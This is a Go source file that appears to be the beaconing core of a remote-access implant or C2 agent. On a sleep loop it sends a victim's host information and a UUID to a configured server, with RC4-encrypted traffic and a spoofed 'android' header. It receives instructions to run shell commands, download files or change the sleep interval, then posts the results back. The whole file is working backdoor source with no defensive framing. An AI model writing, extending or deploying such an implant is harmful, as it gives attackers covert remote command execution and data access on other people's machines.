package core

import (
	"../config"
	"../shell"
	"../utils"
	"bytes"
	"encoding/json"
	"github.com/satori/go.uuid"
	"io/ioutil"
	"net/http"
	"strconv"
	"time"
)

type Result struct {
	Action string `json:"action"`
	Data   string `json:"data"`
}

type Work struct {
	Uuid       string            `json:"uuid"`
	Result     []Result          `json:"result"`
	Info       utils.Information `json:"info"`
	NextSecond int               `json:"next_second"`
}
type Action struct {
	Do   string `json:"do"`
	Data string `json:"data"`
}

type Core struct {
	remoteAddress string
	info          utils.Information
	sleep         int
	uuid          string
	event         []Result
}

func (c *Core) Pool() {

	client := &http.Client{}
	for {

		time.Sleep(time.Duration(c.sleep) * time.Second)
		var result []Action
		data := Work{Uuid: c.uuid, Info: c.info}
		bytesJson, err := json.Marshal(data)
		if err != nil {
			continue
		}
		encode := utils.ImmediateRC4(bytesJson)
		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
		if err != nil {
			continue
		}
		req.Header.Add("UA", "android")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		decode := utils.ImmediateRC4(body)
		err = json.Unmarshal(decode, &result)
		if err != nil {
			continue
		}
		for _, i := range result {
			switch i.Do {
			case "cmd":
				var cmd shell.Shell
				err := json.Unmarshal([]byte(i.Data), &cmd)
				if err != nil {

					c.event = append(c.event, Result{Action: "cmd", Data: err.Error()})
					break
				}
				go func() {
					c.event = append(c.event, Result{Action: "cmd", Data: cmd.ExecuteCmd()})
				}()

			case "download":
				var down shell.Down

				err := json.Unmarshal([]byte(i.Data), &down)
				if err != nil {
					c.event = append(c.event, Result{Action: "download", Data: err.Error()})
				}
				go func() {
					c.event = append(c.event, Result{Action: "download", Data: down.Download()})
				}()

			case "update":
				// update :
			case "sleep":
				sleep, err := strconv.Atoi(i.Data)
				if err == nil {
					c.sleep = sleep
				}
			}
		}

		data = Work{Uuid: c.uuid, Result: c.event, Info: c.info, NextSecond: c.sleep}
		c.event = nil
		bytesJson, err = json.Marshal(data)

		if err != nil {
			continue
		}
		encode = utils.ImmediateRC4(bytesJson)
		req, err = http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
		if err != nil {
			continue
		}
		req.Header.Add("UA", "android")
		resp, _ = client.Do(req)
		_, _ = ioutil.ReadAll(resp.Body)

	}
}

func NewClient() Core {
	var u string
	u2, err := uuid.NewV4()
	if err != nil {
		u = utils.RandStringRunes(16)
	} else {
		u = u2.String()
	}

	c := Core{
		remoteAddress: config.RemoteAddres,
		info:          utils.GetInformation(),
		uuid:          u,
		sleep:         config.DefaultSleep,
	}
	return c
}
